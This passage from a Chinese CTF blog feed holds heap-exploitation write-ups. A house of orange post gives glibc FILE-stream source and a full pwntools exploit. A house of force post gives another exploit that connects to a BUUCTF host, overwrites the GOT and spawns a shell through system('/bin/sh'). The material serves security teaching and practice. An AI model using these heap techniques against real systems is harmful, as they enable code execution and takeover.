函数报错处理"></a>malloc 函数报错处理</h3><p>先要了解 <code>malloc</code> 函数报错时的处理，<code>malloc_printerr </code>是 <code>malloc</code> 中用来打印错误的函数。</p><p><img src="https://api.lemonprefect.cn/image/hdslb/archive/house-of-orange/1635948632210341/fcebe0fcfe89eab79ecd203ccc435bc1d3be2247.png" alt="1"></p><p><code>malloc_printerr</code> 函数其实是调用 <code>__libc_message</code> 函数之后又调用 <code>abort</code> 函数，<code>abort</code> 函数其中调用了 <code>_IO_flush_all_lockp</code>。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span></span><br><span class="line">_IO_flush_all_lockp (<span class="keyword">int</span> do_lock)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">int</span> result = <span class="number">0</span>;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">IO_FILE</span> *<span class="title">fp</span>;</span></span><br><span class="line">  <span class="keyword">int</span> last_stamp;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> _IO_MTSAFE_IO</span></span><br><span class="line">  __libc_cleanup_region_start (do_lock, flush_cleanup, <span class="literal">NULL</span>);</span><br><span class="line">  <span class="keyword">if</span> (do_lock)</span><br><span class="line">    _IO_lock_lock (list_all_lock);</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">  last_stamp = _IO_list_all_stamp;</span><br><span class="line">  fp = (_IO_FILE *) _IO_list_all;   <span class="comment">// 将其覆盖为伪造的链表</span></span><br><span class="line">  <span class="keyword">while</span> (fp != <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      run_fp = fp;</span><br><span class="line">      <span class="keyword">if</span> (do_lock)</span><br><span class="line">    _IO_flockfile (fp);</span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> (((fp-&gt;_mode &lt;= <span class="number">0</span> &amp;&amp; fp-&gt;_IO_write_ptr &gt; fp-&gt;_IO_write_base)   </span><br><span class="line"><span class="meta">#<span class="meta-keyword">if</span> defined _LIBC || defined _GLIBCPP_USE_WCHAR_T</span></span><br><span class="line">       || (_IO_vtable_offset (fp) == <span class="number">0</span></span><br><span class="line">           &amp;&amp; fp-&gt;_mode &gt; <span class="number">0</span> &amp;&amp; (fp-&gt;_wide_data-&gt;_IO_write_ptr</span><br><span class="line">                    &gt; fp-&gt;_wide_data-&gt;_IO_write_base))     <span class="comment">//要伪造的条件</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">       )</span><br><span class="line">      &amp;&amp; _IO_OVERFLOW (fp, EOF) == EOF)     <span class="comment">// fp 指向伪造的 vtable</span></span><br><span class="line">  <span class="comment">/*从_IO_list_all指向的FILE结构开始查找，找到合适_IO_FILE作为_IO_OVERFLOW的参数，执行vtable里面的函数，把IO_FILE结构体本身作为参数*/</span> </span><br><span class="line">    result = EOF;</span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> (do_lock)</span><br><span class="line">    _IO_funlockfile (fp);</span><br><span class="line">      run_fp = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> (last_stamp != _IO_list_all_stamp)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="comment">/* Something was added to the list.  Start all over again.  */</span></span><br><span class="line">      fp = (_IO_FILE *) _IO_list_all;</span><br><span class="line">      last_stamp = _IO_list_all_stamp;</span><br><span class="line">    &#125;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">    fp = fp-&gt;_chain;    <span class="comment">// 指向下一个 IO_FILE 对象</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> _IO_MTSAFE_IO</span></span><br><span class="line">  <span class="keyword">if</span> (do_lock)</span><br><span class="line">    _IO_lock_unlock (list_all_lock);</span><br><span class="line">  __libc_cleanup_region_end (<span class="number">0</span>);</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>如果满足以下条件：</p><ol><li><p>fp-&gt; _mode &gt; 0</p></li><li><p>_IO_vtable_offset (fp) == 0</p></li><li><p>fp-&gt; _wide_data -&gt; _IO_write_ptr &gt; fp-&gt; _ wide_data -&gt; _IO_write_base</p><p>就会调用  _IO_OVERFLOW ，并把结构体当做第一个参数传入<br>如果我们能够把  _IO_OVERFLOW 改为 system ，并且伪造结构体，开头为 /bin/sh ，就能获得 shell 了</p></li></ol><hr><p>简言之</p><ol><li>利用堆溢出将 top chunk size 改小,使其进入 unsorted bin 泄露地址</li><li>在 unsorted bin 伪造使 size 变为 0x60 ，并伪造出一个 io_file 结构</li></ol><h2 id="例题"><a href="#例题" class="headerlink" title="例题"></a>例题</h2><p>buu  houseoforange_hitcon_2016</p><p>这题可以说是 house of orange 里的代表了，可以说上面每个手法都利用到了</p><p>程序没有 free 函数，有堆溢出并能改到 top chunk</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#context.log_level = &#x27;debug&#x27;</span></span><br><span class="line">sh = process(<span class="string">&#x27;./main&#x27;</span>)</span><br><span class="line"><span class="comment">#sh = remote(&#x27;node4.buuoj.cn&#x27;,29741)</span></span><br><span class="line">libc = ELF(<span class="string">&#x27;2.23/libc.so.6&#x27;</span>)</span><br><span class="line"><span class="comment">#libc = ELF(&#x27;./libc-2.23.so&#x27;)</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">build</span>(<span class="params">size,name</span>):</span></span><br><span class="line">   sh.sendlineafter(<span class="string">&#x27;Your choice :&#x27;</span>,<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">   sh.sendlineafter(<span class="string">&#x27;Length of name :&#x27;</span>,<span class="built_in">str</span>(size))</span><br><span class="line">   sh.sendafter(<span class="string">&#x27;Name :&#x27;</span>,name)</span><br><span class="line">   sh.sendlineafter(<span class="string">&#x27;Price of Orange:&#x27;</span>,<span class="string">&#x27;123&#x27;</span>)</span><br><span class="line">   sh.sendlineafter(<span class="string">&#x27;Color of Orange:&#x27;</span>,<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span>():</span></span><br><span class="line">   sh.sendlineafter(<span class="string">&#x27;Your choice :&#x27;</span>,<span class="string">&#x27;2&#x27;</span>)</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span>(<span class="params">size,name</span>):</span></span><br><span class="line">   sh.sendlineafter(<span class="string">&#x27;Your choice :&#x27;</span>,<span class="string">&#x27;3&#x27;</span>)</span><br><span class="line">   sh.sendlineafter(<span class="string">&#x27;Length of name :&#x27;</span>,<span class="built_in">str</span>(size))</span><br><span class="line">   sh.sendafter(<span class="string">&#x27;Name:&#x27;</span>,name)</span><br><span class="line">   sh.sendlineafter(<span class="string">&#x27;Price of Orange:&#x27;</span>,<span class="string">&#x27;123&#x27;</span>)</span><br><span class="line">   sh.sendlineafter(<span class="string">&#x27;Color of Orange:&#x27;</span>,<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line"> </span><br><span class="line">build(<span class="number">0x30</span>,<span class="string">&#x27;a&#x27;</span>*<span class="number">0x30</span>)</span><br><span class="line"><span class="comment">#修改top chunk的size为0xF80</span></span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span>*<span class="number">0x30</span> + p64(<span class="number">0</span>) + p64(<span class="number">0x21</span>) + <span class="string">&#x27;b&#x27;</span>*<span class="number">0x10</span> + p64(<span class="number">0</span>) + p64(<span class="number">0xF80</span>)</span><br><span class="line">edit(<span class="built_in">len</span>(payload),payload)</span><br><span class="line"></span><br><span class="line"><span class="comment">#申请一个比top chunk的size大的空间，那么top chunk会被放入unsorted bin</span></span><br><span class="line">build(<span class="number">0x1000</span>,<span class="string">&#x27;b&#x27;</span>)</span><br><span class="line">build(<span class="number">0x400</span>,<span class="string">&#x27;c&#x27;</span>)</span><br><span class="line">show()</span><br><span class="line"><span class="comment">#接下来申请unsorted bin里的chunk，泄露libc地址和堆地址</span></span><br><span class="line">sh.recvuntil(<span class="string">&#x27;Name of house : &#x27;</span>)</span><br><span class="line">leak = u64(sh.recvuntil(<span class="string">&#x27;\n&#x27;</span>,drop = <span class="literal">True</span>).ljust(<span class="number">8</span>,<span class="string">&#x27;\x00&#x27;</span>))</span><br><span class="line">io_list_all = (leak &amp; <span class="number">0xFFFFFFFFFFFFF000</span>) + (libc.symbols[<span class="string">&#x27;_IO_list_all&#x27;</span>] &amp; <span class="number">0xFFF</span>)</span><br><span class="line">libcbase = io_list_all - libc.symbols[<span class="string">&#x27;_IO_list_all&#x27;</span>]</span><br><span class="line">system = libcbase + libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">#这边算出的 io_list_all 地址是错的</span></span><br><span class="line"><span class="string">sh.recvuntil(&#x27;Name of house : &#x27;)</span></span><br><span class="line"><span class="string">leak = u64(sh.recvuntil(&#x27;\x7f&#x27;)[-6:].ljust(8,&#x27;\x00&#x27;))</span></span><br><span class="line"><span class="string">print &quot;leak: &quot; + hex(leak)</span></span><br><span class="line"><span class="string">libcbase = leak -4451</span></span><br><span class="line"><span class="string">print &quot;libcbase: &quot; + hex(libcbase)</span></span><br><span class="line"><span class="string">io_list_all = libcbase + libc.sym[&#x27;_IO_list_all&#x27;]</span></span><br><span class="line"><span class="string">system = libc.symbols[&#x27;system&#x27;] + libcbase</span></span><br><span class="line"><span class="string">print &quot;io_list_all: &quot; + hex(io_list_all)</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line">payload = <span class="string">&#x27;b&#x27;</span> * <span class="number">0x10</span></span><br><span class="line">edit(<span class="number">0x10</span>, payload)</span><br><span class="line">show()</span><br><span class="line">sh.recvuntil(<span class="string">&#x27;b&#x27;</span>*<span class="number">0x10</span>)</span><br><span class="line">heap = u64(sh.recvuntil(<span class="string">&#x27;\x55&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">&#x27;\x00&#x27;</span>))</span><br><span class="line"><span class="built_in">print</span> <span class="string">&quot;heap: &quot;</span> + <span class="built_in">hex</span>(heap)</span><br><span class="line">heap_base = heap - <span class="number">0xE0</span></span><br><span class="line"><span class="built_in">print</span> <span class="string">&quot;heap_base: &quot;</span> + <span class="built_in">hex</span>(heap_base)</span><br><span class="line">gdb.attach(sh)</span><br><span class="line">-----------------------------------------------------------------------------------------------------</span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span>*<span class="number">0x400</span></span><br><span class="line">payload += p64(<span class="number">0</span>) + p64(<span class="number">0x21</span>) + <span class="string">&#x27;a&#x27;</span>*<span class="number">0x10</span></span><br><span class="line"><span class="comment">#可以说是一个模板了</span></span><br><span class="line"><span class="comment">#执行vtable的函数时，FILE结构体地址被作为参数，因此，我们在最开头写/bin/sh字符串</span></span><br><span class="line">fake_file = <span class="string">&#x27;/bin/sh\x00&#x27;</span> + p64(<span class="number">0x60</span>) <span class="comment">#size作为0x60，被放入small_bin，从而对应了chain指针</span></span><br><span class="line"><span class="comment">#unsorted bin attack，修改_IO_list_all为main_arena+88</span></span><br><span class="line">fake_file += p64(<span class="number">0</span>) + p64(io_list_all-<span class="number">0x10</span>)</span><br><span class="line">fake_file += p64(<span class="number">0</span>) + p64(<span class="number">1</span>)<span class="comment">#_IO_write_base &lt; _IO_write_ptr</span></span><br><span class="line">fake_file = fake_file.ljust(<span class="number">0xC0</span>,<span class="string">&#x27;\x00&#x27;</span>)</span><br><span class="line">fake_file += p64(<span class="number">0</span>)*<span class="number">3</span></span><br><span class="line">fake_file += p64(heap_base + <span class="number">0x5E8</span>)<span class="comment">#vtable ptr</span></span><br><span class="line">fake_file += p64(<span class="number">0</span>)*<span class="number">2</span></span><br><span class="line">fake_file += p64(system) <span class="comment">#__overflow</span></span><br><span class="line">payload += fake_file</span><br><span class="line">edit(<span class="built_in">len</span>(payload),payload)</span><br><span class="line"></span><br><span class="line">sh.recv()</span><br><span class="line">sh.sendline(<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line"> </span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure><p>说一下被注释的地方为啥是错的，因为我们泄露出来的地址是处在 libc 的 data 段</p><p><img src="https://api.lemonprefect.cn/image/hdslb/archive/house-of-orange/1636081342722980/0278602ef7af7a0bf3e3a3511c415db5139d8e29.png" alt="image-20211105110222421"></p><p>而我们需要的是代码段的基地址，可以看到算出来的 _IO_list_all 地址也是错的</p><p><img src="https://api.lemonprefect.cn/image/hdslb/archive/house-of-orange/1636082226040989/94ed1174b442b72efad937301d15ea8fc26e64f5.png" alt="image-20211105111705852"></p><p>咋整捏，可以直接在 gdb 中找我们需要的函数地址，会发现我们泄露出来的地址和 _IO_list_all 很接近</p><p><img src="https://api.lemonprefect.cn/image/hdslb/archive/house-of-orange/1636082503422977/6ee291b744e13aa10e613abc624b31f40be03b3a.png" alt="image-20211105112143172"></p><p>地址后三位是不会变的，于是想到直接凑</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">io_list_all = (leak &amp; <span class="number">0xFFFFFFFFFFFFF000</span>) + (libc.symbols[<span class="string">&#x27;_IO_list_all&#x27;</span>] &amp; <span class="number">0xFFF</span>)</span><br></pre></td></tr></table></figure><p>然后就可以算出 libcbase 了</p><hr><p>参考博客</p><p><a href="https://blog.csdn.net/weixin_44145820/article/details/105270036">https://blog.csdn.net/weixin_44145820/article/details/105270036</a></p><p><a href="https://bbs.pediy.com/thread-222718.htm">https://bbs.pediy.com/thread-222718.htm</a></p><p><a href="https://blog.csdn.net/seaaseesa/article/details/104314949">https://blog.csdn.net/seaaseesa/article/details/104314949</a></p><p><a href="https://www.cnblogs.com/L0g4n-blog/p/14217309.html">https://www.cnblogs.com/L0g4n-blog/p/14217309.html</a></p>]]></content>
      
      
      <categories>
          
          <category> 堆利用 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> PWN </tag>
            
            <tag> 堆 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>堆利用之house of force</title>
      <link href="/2021/11/01/%E5%A0%86%E5%88%A9%E7%94%A8%E4%B9%8Bhouse-of-force/"/>
      <url>/2021/11/01/%E5%A0%86%E5%88%A9%E7%94%A8%E4%B9%8Bhouse-of-force/</url>
      
        <content type="html"><![CDATA[<p> house of force 是一种堆的利用手法，可以实现内存地址的读写。</p><h2 id="top-chunk-的分割机制"><a href="#top-chunk-的分割机制" class="headerlink" title="top chunk 的分割机制"></a>top chunk 的分割机制</h2><p>top chunk 是堆内存管理器的后备空间，当各 bin 中没有 chunk 可以提供时，top chunk 会分割出一个 chunk 给用户，下面给出分割过程的源码。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">victim = av-&gt;top;</span><br><span class="line">size   = chunksize(victim);</span><br><span class="line"><span class="keyword">if</span> ((<span class="keyword">unsigned</span> <span class="keyword">long</span>) (size) &gt;= (<span class="keyword">unsigned</span> <span class="keyword">long</span>) (nb + MINSIZE)) </span><br><span class="line">&#123;</span><br><span class="line">    remainder_size = size - nb;</span><br><span class="line">    remainder      = chunk_at_offset(victim, nb);</span><br><span class="line">    av-&gt;top        = remainder;</span><br><span class="line">    set_head(victim, nb | PREV_INUSE |</span><br><span class="line">            (av != &amp;main_arena ? NON_MAIN_ARENA : <span class="number">0</span>));</span><br><span class="line">    set_head(remainder, remainder_size | PREV_INUSE);</span><br><span class="line"></span><br><span class="line">    check_malloced_chunk(av, victim, nb);</span><br><span class="line">    <span class="keyword">void</span> *p = chunk2mem(victim);</span><br><span class="line">    alloc_perturb(p, bytes);</span><br><span class="line">    <span class="keyword">return</span> p;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ol><li>首先是 libc 会检查用户申请的大小，top chunk 给不给得起；</li><li>如果给得起，就在 top chunk 的 head 处，<strong>以用户申请大小所匹配的 chunk 大小为偏移量，将 top chunk 的位置推到新的位置</strong>，而原来的 top chunk head 处就作为新的堆块被分配给用户了；</li></ol><p>如果我们能控制 top chunk 在这个过程中偏移到任意位置，也就是说，如果我们能控制用户申请的大小为任意值，我们就能将 top chunk 劫持到任意内存地址，然后就可以控制目标内存。</p><hr><p><strong>简言之</strong></p><ol><li>溢出已经分配的 chunk，覆盖到 top chunk 的 size 位；</li><li>算出 top chunk 与目标地址的距离，将 top chunk 位置推到目标地址</li></ol><h2 id="溢出-top-chunk"><a href="#溢出-top-chunk" class="headerlink" title="溢出 top chunk"></a>溢出 top chunk</h2><p>当我们 malloc 一个堆块，此堆块的下一个就是 top chunk 时，当我们输入的数据大小能够超过申请的大小，就能堆溢出到 top chunk，当我们将 top chunk 的 size 字段改得非常大时就可以通过检查了，一般我们会传入 -1 ，因为 ptmalloc 的源码中对于 size 使用 unsigned long 进行强转抓换，负数用补码表示，将 -1 当成无符号数为 0xffffffffffffffff ，已经非常大了，用于绕过 if ((unsigned long) (size) &gt;= (unsigned long) (nb + MINSIZE)) 验证。</p><h2 id="例题"><a href="#例题" class="headerlink" title="例题"></a>例题</h2><p>buu 上的 bcloud_bctf_2016</p><p>程序开的保护如下</p><p><img src="https://api.lemonprefect.cn/image/hdslb/archive/house-of-force/1635751369496160/0bc4ec261d145b38518a3d6da6e1f2f8604df736.png"></p><p>本题最大的漏洞就在这两个函数中</p><p><img src="https://api.lemonprefect.cn/image/hdslb/archive/house-of-force/1635754889755826/752b846ae81dff98b7c487e33f8e70cdb0a50d25.png" alt="image-20211101162129641"></p><h3 id="func1"><a href="#func1" class="headerlink" title="func1"></a>func1</h3><p>s 处输入 0x40 个字符能够覆盖到指针 v2 ，之后的堆地址又赋给了 v2 ，意味着 v2 处 s 的 0截断字符 被覆盖成了堆指针，从而在 strcpy 处可以泄露处可以泄露出堆地址</p><p><img src="https://api.lemonprefect.cn/image/hdslb/archive/house-of-force/1635755409091509/ec1d1c267e74848e198785e209c21a650c95c04d.png" alt="image-20211101163008961"></p><h3 id="func2"><a href="#func2" class="headerlink" title="func2"></a>func2</h3><p>也是同理，并且因为 v3 和 s 只相差 4 个字符的缘故，可以修改到 top chunk 的 size 位</p><p><img src="https://api.lemonprefect.cn/image/hdslb/archive/house-of-force/1635755367270204/f1f8b1e48ac0581bc5e7f13e4eca57ba2b1cdad2.png" alt="image-20211101162927102"></p><p>由于程序没有开 pie ，因此地址之间的偏移可以直接算出来，达到了 house of force 的条件，计算出 top chunk 和 chunk_addr (heap array) 的地址，就可以将 top chunk 指针 指向 heap array 从而控制整个堆指针数组，实现任意地址的读写。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"><span class="comment">#p = process(&#x27;./main&#x27;)</span></span><br><span class="line">p = remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="string">&#x27;27866&#x27;</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;./main&#x27;</span>)</span><br><span class="line"><span class="comment">#libc = ELF(&#x27;2.23/libc.so.6&#x27;)</span></span><br><span class="line">libc = ELF(<span class="string">&#x27;libc-2.23.so&#x27;</span>)</span><br><span class="line">puts_plt = elf.plt[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">puts_got = elf.got[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">free_got = elf.got[<span class="string">&#x27;free&#x27;</span>]</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span>(<span class="params">leng,con</span>):</span></span><br><span class="line">p.sendline(<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&#x27;:&#x27;</span>,<span class="built_in">str</span>(leng))</span><br><span class="line">p.sendlineafter(<span class="string">&#x27;:&#x27;</span>,con)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span>():</span></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;&gt;&gt;&#x27;</span>,<span class="string">&#x27;2&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span>(<span class="params">idx,con</span>):</span></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;&gt;&gt;&#x27;</span>,<span class="string">&#x27;3&#x27;</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&#x27;:&#x27;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line">p.sendlineafter(<span class="string">&#x27;:&#x27;</span>,con)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dele</span>(<span class="params">idx</span>):</span></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;&gt;&gt;&#x27;</span>,<span class="string">&#x27;4&#x27;</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&#x27;:&#x27;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line">p.sendafter(<span class="string">&#x27;name:&#x27;</span>,<span class="string">&#x27;a&#x27;</span>*<span class="number">0x40</span>)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;a&#x27;</span>*<span class="number">0x40</span>)</span><br><span class="line">leak = u32(p.recv(<span class="number">4</span>))</span><br><span class="line"><span class="built_in">print</span> <span class="string">&quot;leak:&quot;</span> + <span class="built_in">hex</span>(leak)</span><br><span class="line">p.sendafter(<span class="string">&#x27;Org:&#x27;</span>,<span class="string">&#x27;b&#x27;</span>*<span class="number">0x40</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&#x27;Host:&#x27;</span>,p32(<span class="number">0xFFFFFFFF</span>))<span class="comment">#修改top chunk的size</span></span><br><span class="line">top_chunk = leak + <span class="number">0xd0</span></span><br><span class="line"><span class="built_in">print</span> <span class="string">&quot;top_chunk: &quot;</span> + <span class="built_in">hex</span>(top_chunk)</span><br><span class="line">chunk_addr = <span class="number">0x0804B120</span></span><br><span class="line">offset = chunk_addr - top_chunk - <span class="number">0x10</span></span><br><span class="line">add(offset,<span class="string">&#x27; &#x27;</span>)<span class="comment">#0</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#现在top chunk移到了heap_array_addr-0x8处，我们可以控制heap_array了</span></span><br><span class="line">add(<span class="number">0x18</span>,<span class="string">&#x27;a&#x27;</span>)<span class="comment">#1</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#修改heap_array</span></span><br><span class="line">edit(<span class="number">1</span>,p32(<span class="number">0</span>) + p32(free_got) + p32(puts_got) + p32(<span class="number">0x0804B130</span>) + <span class="string">&#x27;/bin/sh\x00&#x27;</span>)</span><br><span class="line"><span class="comment">#修改free的got表为puts的plt表</span></span><br><span class="line">edit(<span class="number">1</span>,p32(puts_plt) + <span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line"><span class="comment">#泄露puts的地址</span></span><br><span class="line">dele(<span class="number">2</span>)</span><br><span class="line">leak = u32(p.recvuntil(<span class="string">&#x27;\xf7&#x27;</span>)[-<span class="number">4</span>:])</span><br><span class="line"><span class="built_in">print</span> <span class="string">&quot;puts_got: &quot;</span> + <span class="built_in">hex</span>(leak)</span><br><span class="line">libcbase  = leak - libc.sym[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line"><span class="built_in">print</span> <span class="string">&quot;libcbase: &quot;</span> + <span class="built_in">hex</span>(libcbase)</span><br><span class="line">system = libcbase + libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">edit(<span class="number">1</span>,p32(system))</span><br><span class="line">dele(<span class="number">3</span>)</span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><hr><p>参考链接</p><p><a href="https://blog.csdn.net/haibiandaxia/article/details/108260537">https://blog.csdn.net/haibiandaxia/article/details/108260537</a></p><p><a href="https://blog.csdn.net/seaaseesa/article/details/105588058">https://blog.csdn.net/seaaseesa/article/details/105588058</a></p>]]></content>
      
      
      <categories>
          
          <category> 堆利用 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> PWN </tag>
            
            <tag> 堆 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Ret2dl</title>
      <link href="/2021/10/30/Ret2dl/"/>
      <url>/2021/10/30/Ret2dl/</url>
      
